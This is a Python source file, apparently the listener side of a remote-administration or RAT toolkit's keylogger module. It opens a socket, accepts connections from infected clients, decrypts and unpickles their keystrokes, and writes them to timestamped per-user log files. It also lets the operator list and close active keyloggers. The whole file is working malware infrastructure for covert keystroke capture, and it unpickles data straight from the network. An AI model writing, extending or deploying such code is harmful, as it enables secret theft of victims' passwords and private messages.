import socket
import pickle
import zlib
import time
from sys import exit
from Specific.encrypt import Encryption
from Utilities.db_queries import get_module_data


# Keylogger settings
try:
	# Address
	info = get_module_data()
	# Settings
	keylogger_settings = []
	# Socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((info[1], int(info[3].split(',')[3])))
	s.listen()
except:
	exit(0)


def keylogger_info():
	info = '\n'
	
	for index, setting in enumerate(keylogger_settings):
		info += f'    - {setting[0]}[{index}]'
		if len(keylogger_settings) > 1 and index + 1 != len(keylogger_settings):
			info += '\n'
	
	if len(keylogger_settings) == 0:
		info = 'False'
		
	return info


def set_keylogger_settings(index):
	global keylogger_settings

	try:
		if index == '*':
			for keylogger_setting in keylogger_settings:
				keylogger_setting[1].close()
			return 'Keyloggers closed!'
		else:
			keylogger_settings[int(index)][1].close()
			return 'Keylogger closed!'
	except:
		return 'Keylogger failed to close.'


def get_logs(index):
	try:
		with open(keylogger_settings[index][3], 'r') as f:
			return (keylogger_settings[index][0], f.read())
	except:
		return None


def Keylogger(encoding, path, user):
	try:
		global keylogger_settings

		fn = f'{path}/{time.strftime("%Y-%m-%d (%H-%M-%S)")}.txt'
		first = True
		headersize = 10
		new_msg = True
		msg_len = 0
		full_msg = b''
		msg = b'next'

		e = Encryption()
		client, addr = s.accept()

		u = (user, client, addr, fn)
		keylogger_settings.append(u)


		with open(fn, 'a') as f:
			f.write(f'Logging key strokes of {user}...  [{time.strftime("%Y-%m-%d (%H-%M-%S)")}]\n\n')
			f.flush()

			real_msg = pickle.dumps(msg)
			real_msg = zlib.compress(real_msg, 1)
			real_msg = e.do_encrypt(real_msg)
			final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
			client.send(final_msg)

			while True:
				client_msg = client.recv(1024)

				if new_msg:
					msg_len = int(client_msg[:headersize])
					new_msg = False

				full_msg += client_msg

				if len(full_msg)-headersize == msg_len:
					log = e.do_decrypt(full_msg[headersize:])
					log = zlib.decompress(log)
					log = pickle.loads(log)

					result = ''
					key = log.replace("'", '')
					t = time.strftime("%Y-%m-%d (%H-%M-%S): ")

					if first:
						if 'Key.space' not in log or 'Key.enter' not in log:
							result = t
						first = False
					
					if len(key) > 1:
						result += f'[{key}]'  
					else:
						result += key

					if 'Key.space' in log or 'Key.enter' in log:
						result = f'\n{t}{result}' 
					
					f.write(result)
					f.flush()

					real_msg = pickle.dumps(msg)
					real_msg = zlib.compress(real_msg, 1)
					real_msg = e.do_encrypt(real_msg)
					final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
					client.send(final_msg)
					
					new_msg = True
					msg_len = 0
					full_msg = b''
	except:
		keylogger_settings.remove(u)
		exit(0)